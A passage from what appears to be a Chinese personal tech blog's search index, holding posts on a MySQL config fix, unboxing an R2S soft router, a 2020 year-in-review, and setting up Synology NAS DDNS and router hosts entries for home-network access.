src="https://s2.loli.net/2022/09/16/Q96ast75VfPKo2b.png" alt="img"></p><p>  依葫芦画瓢，新建对应的字段用于存储数据。</p><p><img src="https://s2.loli.net/2022/09/16/pmhEPaXDBrqjgCN.png" alt="img"></p><p>  至此，数据库的准备工作就完成了。接下来，我会在下一篇文章中详细讲述编写登录和注册页面的源代码的过程，谢谢大家的支持！</p><h2 id="SQLfront报错"><a href="#SQLfront报错" class="headerlink" title="SQLfront报错"></a>SQLfront报错</h2><p>  在创建数据库的过程中，我遇到了一些意想不到的情况。例如，下图的1055号报错。</p><p><img src="https://s2.loli.net/2022/09/16/EDlvpc6Gt42fd5J.png" alt="img"></p><p>  解决方法：在“PHPstudy_pro”文件夹的“Extensions”子目录中找到MySQL对应的文件夹，并用记事本打开里面的my.ini文件。</p><p><img src="https://s2.loli.net/2022/09/16/Uw9MADmCXEjJdhL.png" alt="img"></p><p>  在【mysqld】下面添加方框内语句，保存后重启PHPstudy。</p><p><img src="https://s2.loli.net/2022/09/16/9e8tfc7b2yozusT.png" alt="img"></p><p>  重新进入SQLfront，没有再出现报错！</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>感谢大家的耐心阅读，如有疑问，敬请在评论区留言！</p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>前端</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>R2S软路由开箱&amp;初体验</title>
    <link href="/2021/01/26/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E5%BC%80%E7%AE%B1-%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <url>/2021/01/26/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E5%BC%80%E7%AE%B1-%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<p>创作立场声明：本文只是单纯的经验分享，没有任何恰饭行为!转载前请联系作者授权，并附上此文章链接!</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间在油管上看到东东的视频，对这款r2s各种推荐，于是在心里默默地种草了。正好要搬新家了，准备买它做旁路由科学上网+去广告，以前的网件r7000就光荣退役做AP。后来终于没忍住，还是去东东的tb店铺果断拔草了这款软路由。P.S.由于我买的是满配版，所以不用自己刷固件（其实就是懒得折腾）</p><h2 id="开箱"><a href="#开箱" class="headerlink" title="开箱"></a>开箱</h2><p>打开包装，只有三样东西：软路由本体、充电器、USB2.0读卡器，简洁明了。</p><p><img src="http://terry906.top/wp-content/uploads/2021/01/1611629521902-768x1024.jpg" alt="img"></p><p>仔细看看r2s的构造：1个lan口（USB3.0转的），1个wan口，还有一个type-c的供电口。</p><p><img src="http://terry906.top/wp-content/uploads/2021/01/1611629068451-857x1024.jpg" alt="img"></p><p>下图是另外一面，可以看到买来就已经插好的SD卡</p><p><img src="http://terry906.top/wp-content/uploads/2021/01/QQ%E5%9B%BE%E7%89%8720210126110120-1024x1006.png" alt="img"></p><h2 id="初体验"><a href="#初体验" class="headerlink" title="初体验"></a>初体验</h2><p>话不多说，我们连接电脑到它的后台页面看看。</p><p>首先在电脑浏览器输入192.168.2.1或者192.168.22.1（根据固件不同而不同），密码默认为password。</p><p><img src="http://terry906.top/wp-content/uploads/2021/01/op5-1024x497.jpg" alt="img"></p><p>进入后台以后，我们看看它的主界面。可以看到，功能还挺多的。</p><p><img src="http://terry906.top/wp-content/uploads/2021/01/op1-1024x501.jpg" alt="img"></p><p>接着来看看它的文件传输页面（这里我上传的是adguard home的openwrt版插件）</p><p><img src="http://terry906.top/wp-content/uploads/2021/01/op2-1024x500.jpg" alt="img"></p><p>来看看它自带的软件吧（除了adguard home是我自己安装的以外，其它的都是固件自带）<strong>以后会专门写一篇文章，介绍adguard home（openwrt版）如何设置</strong></p><p><img src="http://terry906.top/wp-content/uploads/2021/01/op3-1024x503.jpg" alt="img"></p><p>这款软路由还支持多线多拨（真不知道这块arm架构的CPU和螃蟹网卡顶不顶得住）</p><p><img src="http://terry906.top/wp-content/uploads/2021/01/op4-1024x500.jpg" alt="img"></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>好了，体验暂时到这里了，过段时间搬家了再来折腾旁路由的设置。如有疑问，欢迎在评论区留言！</p><p>2022&#x2F;1&#x2F;6更新：由于这款软路由的科学性能太差，故已将其在海鲜市场出售！ARM架构还是不行啊！</p>]]></content>
    
    
    <categories>
      
      <category>网络运维</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数码折腾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2020年度总结</title>
    <link href="/2021/01/24/2020%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <url>/2021/01/24/2020%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间是考试周，一直忙于复习而没有时间更新博客，现在放假了，就来写（shui）一篇吧，嘿嘿！</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>终于，我们要告别这个跌宕起伏令人悲喜交加的2020年。这是充满了挑战的一年，也是充满了机遇的一年，这一年，有人欢喜，有人悲伤；这一年，有人获得，有人失去。匆匆忙忙间，最终还是来到的告别的时候。再见了，让你我不开心的2020年；你好呀，充满了希望的2021年！<br>2020年，注定是不平凡的一年。身为一名武汉本地人，我能更深切地感受到新冠疫情给我的生活带来的影响：高考试卷难度下调，导致高考失利；线上教学效果甚微，让我对返校复学充满期盼；疫情期间武汉封城，导致我被困老家40余天······然而，疫情除了给我带来打击以外，也让我找到了能为之奋斗的目标–成为一名网络&#x2F;信息安全工程师。高考后的暑假，我学会了自己组装一台台式电脑，学会了折腾智能路由器并给它们刷各种第三方固件，学会了搭建自己的私有云服务器；上大学以后，我不仅学会了用pr进行视频剪辑，用arctime pro制作字幕，还学会了用WordPress建立了自己的个人博客。回首2020，既有高考失利的失望，也有获得荣誉的骄傲，例如获得全国大学生英语竞赛全国一等奖，阿里云网站设计大赛优秀奖（毕竟零基础）······<br>回首上半年，我活的很颓废；回首下半年，我的生活有了光 。在其它学院的学长学姐的帮助下，我的大学生活逐渐步入正轨。第一次交女性朋友，第一次和女生出去玩，第一次参加志愿者活动······有太多的第一次。认识到了很多有趣的人，虽然不是我想象中的来自全国各地，但也让我很开心。纵使我没能考到理想的大学，认识这些人，让我觉得人间值得！</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>希望在2021这新的一年，我能够顺利拿到驾照，通过四级考试，在美赛中再创佳绩，也祝我和我的室友们全体脱单！凡是过往，皆为序章，2021年，大家一起冲冲冲！</p>]]></content>
    
    
    <categories>
      
      <category>生活点滴</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>群晖NAS配置DNSPodDDNS实现外网访问</title>
    <link href="/2020/12/23/%E7%BE%A4%E6%99%96NAS%E9%85%8D%E7%BD%AEDNSPodDDNS%E5%AE%9E%E7%8E%B0%E5%A4%96%E7%BD%91%E8%AE%BF%E9%97%AE/"/>
    <url>/2020/12/23/%E7%BE%A4%E6%99%96NAS%E9%85%8D%E7%BD%AEDNSPodDDNS%E5%AE%9E%E7%8E%B0%E5%A4%96%E7%BD%91%E8%AE%BF%E9%97%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文将详解如何使用群晖NAS自带的DDNS功能来实现腾讯云DNSPod动态域名解析。这里我将以阿里云购买的域名为例。</p><h2 id="设置你的域名DNS服务器到DNSPod"><a href="#设置你的域名DNS服务器到DNSPod" class="headerlink" title="设置你的域名DNS服务器到DNSPod"></a>设置你的域名DNS服务器到DNSPod</h2><p>登录阿里云控制台，在搜索框内搜索“域名控制台”，点击你的域名并修改DNS（我的之前已经改好了）修改为：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">f1g1ns1<span class="hljs-selector-class">.dnspod</span><span class="hljs-selector-class">.net</span><br>f1g1ns2<span class="hljs-selector-class">.dnspod</span>.net<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/09/16/jBdlwh9EH1Ksqa2.png" alt="img"></p><h2 id="设置域名解析"><a href="#设置域名解析" class="headerlink" title="设置域名解析"></a>设置域名解析</h2><p>注册dnspod并登录（也可用腾讯云账户直接登录）</p><p>dnspod官网：<a href="https://www.dnspod.cn/">https://www.dnspod.cn/</a></p><p>域名解析，添加域名，输入域名：</p><p><img src="https://s2.loli.net/2022/09/16/UuSO8yTfmnMIhNz.png" alt="img"></p><p>进入管理控制台，点击“DNS解析”：</p><p><img src="https://s2.loli.net/2022/09/16/TlZJwFUSoLtNdu6.png" alt="img"></p><p>点击你的域名，添加记录，设置解析你的域名A记录到任意IP（0.0.0.0）：</p><p><img src="https://s2.loli.net/2022/09/16/mW6ojpl2QeFCEKP.png" alt="img">转到“密钥管理”并点击“创建密钥”：</p><p><img src="https://s2.loli.net/2022/09/16/mW6ojpl2QeFCEKP.png" alt="img"></p><p><img src="https://s2.loli.net/2022/09/16/EuHNOPWCo58ywr3.png" alt="img">复制保存生成的ID和token：</p><p><img src="https://s2.loli.net/2022/09/16/EuHNOPWCo58ywr3.png" alt="img"></p><p><strong>Token信息仅在创建时显示一次,请及时复制保存！</strong></p><h2 id="配置群晖DDNS"><a href="#配置群晖DDNS" class="headerlink" title="配置群晖DDNS"></a>配置群晖DDNS</h2><p>点击“控制面板”中的“外部访问”：</p><p><img src="https://s2.loli.net/2022/09/16/WHyu7lXDBrCpvwb.png" alt="img">在“DDNS”中选择“新增”：</p><p><img src="https://s2.loli.net/2022/09/16/muhqBA7rnWbxlQk.png" alt="img"></p><p>服务提供商选择DNSPod.cn：</p><p><img src="https://s2.loli.net/2022/09/16/8FkzRgC5N6o4jSW.png" alt="img">输入域名（www开头)，用户名填写刚才创建的ID，密码填写刚才创建的Token，再点击确定：</p><p><img src="https://s2.loli.net/2022/09/16/Fer1cl9RVzJo8WZ.png" alt="img"></p><p>解析成功后状态会显示“正常”。</p><p>重启路由器，使公网IP变更。</p><p>群晖检测到新IP，并通知服务提供商更改域名指向，成功保持解析。</p><h2 id="配置路由器端口"><a href="#配置路由器端口" class="headerlink" title="配置路由器端口"></a>配置路由器端口</h2><p>配置路由器端口转发，使外网能够访问群晖DSM端口。</p><h3 id="查询或修改群晖DSM端口-本文以5000-x2F-5001为例"><a href="#查询或修改群晖DSM端口-本文以5000-x2F-5001为例" class="headerlink" title="查询或修改群晖DSM端口(本文以5000&#x2F;5001为例)"></a>查询或修改群晖DSM端口(本文以5000&#x2F;5001为例)</h3><p>在控制面板中选择“网络”并打开：</p><p><img src="https://s2.loli.net/2022/09/16/QbGcdgqUa2jnfoE.png" alt="img"></p><p>DSM默认端口：HTTP为5000，HTTPS为5001</p><p><img src="https://s2.loli.net/2022/09/16/NQJB2ERgqLGIZ45.png" alt="img"></p><h3 id="登录路由器配置端口转发（这里以梅林固件路由器为例）"><a href="#登录路由器配置端口转发（这里以梅林固件路由器为例）" class="headerlink" title="登录路由器配置端口转发（这里以梅林固件路由器为例）"></a>登录路由器配置端口转发（这里以梅林固件路由器为例）</h3><p>添加DSM的HTTP和HTTPS端口到群晖的内网IP上，选择TCP协议，按照下图填写后点击后面的加号，再点击底部的“应用保存设置”。</p><p>P.S.部分型号路由器保存后需要重启才能生效，如果DSM的默认端口修改过，这里需要把端口号改为修改过的端口号。</p><p><img src="https://s2.loli.net/2022/09/16/aMC4nNXyxWPphAT.png" alt="img">配置完成，现在可以用你的域名外网访问群晖NAS了！但是，仅仅这样设置是不能内网用域名访问NAS的。内网访问的方法，请参考本人的另一篇博客：</p><p><a href="https://hackerterry.netlify.app/2020/12/21/%E6%A2%85%E6%9E%97%E5%9B%BA%E4%BB%B6%E8%B7%AF%E7%94%B1%E5%99%A8%E4%BF%AE%E6%94%B9hosts%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E9%80%9A%E8%BF%87%E5%9F%9F%E5%90%8D%E8%AE%BF%E9%97%AE%E7%BE%A4%E6%99%96dsm/">https://hackerterry.netlify.app/2020/12/21/%E6%A2%85%E6%9E%97%E5%9B%BA%E4%BB%B6%E8%B7%AF%E7%94%B1%E5%99%A8%E4%BF%AE%E6%94%B9hosts%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E9%80%9A%E8%BF%87%E5%9F%9F%E5%90%8D%E8%AE%BF%E9%97%AE%E7%BE%A4%E6%99%96dsm/</a></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>感谢大家的耐心阅读，如有疑问，敬请在下方留言！</p>]]></content>
    
    
    <categories>
      
      <category>网络运维</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数码折腾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>梅林固件路由器修改hosts实现内网通过域名访问群晖dsm</title>
    <link href="/2020/12/21/%E6%A2%85%E6%9E%97%E5%9B%BA%E4%BB%B6%E8%B7%AF%E7%94%B1%E5%99%A8%E4%BF%AE%E6%94%B9hosts%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E9%80%9A%E8%BF%87%E5%9F%9F%E5%90%8D%E8%AE%BF%E9%97%AE%E7%BE%A4%E6%99%96dsm/"/>
    <url>/2020/12/21/%E6%A2%85%E6%9E%97%E5%9B%BA%E4%BB%B6%E8%B7%AF%E7%94%B1%E5%99%A8%E4%BF%AE%E6%94%B9hosts%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E9%80%9A%E8%BF%87%E5%9F%9F%E5%90%8D%E8%AE%BF%E9%97%AE%E7%BE%A4%E6%99%96dsm/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近买了一台群晖nas，是已经停产的ds218play(因为没钱），开始了小白瞎折腾的漫长过程。因为长期住校，想通过域名访问家里群晖dsm实现多种功能，例如外网映射磁盘，但是这样以后发现内网无法用域名访问dsm!经过漫长的摸索以后，我这个小白竟然成功了!在这里分享给大家具体方法，不用putty，不用secureCRT即可实现!</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先在网上下载WinSCP软件，下载安装后如图</p><p><img src="https://s2.loli.net/2022/09/14/iQrxMAhg5B9W2cl.jpg" alt="img"></p><p>选择 SCP 协议，主机名也就是自己路由器的管理页面 IP，用户名和密码也和登陆路由管理页面用的一样，连接即可。端口不变，填写完后点登录，如图</p><p><img src="https://s2.loli.net/2022/09/14/41uNsDa2AlK37Cy.jpg" alt="img"></p><p>连上之后一路往回到路由根目录，进入&#x2F;jffs&#x2F;configs 目录，新建一个 dnsmasq.conf.add 文件，写入以下内容：<code>addn-hosts=/jffs/configs/hosts</code></p><p>写入方式就和平时windows编辑txt文本文档一样，注意文件名就是dnsmasq.conf.add</p><p>再新建一个文件，文件名就是hosts，再写入以下内容(我的群晖nas内网IP是192.168.50.66):</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.50.66</span> www.xxx.xxx<br><br># 例如:<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">164</span> smartplugconnect.phicomm.com<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/09/14/41uNsDa2AlK37Cy.jpg" alt="img"></p><p>两个文件添加完以后，弹出的对话框选择“是”，再重启路由器。然后局域网内任何一台电脑(最好是其它电脑)用windows 的命令行或者powershell，ping一下你的域名，出现nas的内网IP就成功了!</p>]]></content>
    
    
    <categories>
      
      <category>网络运维</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数码折腾</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
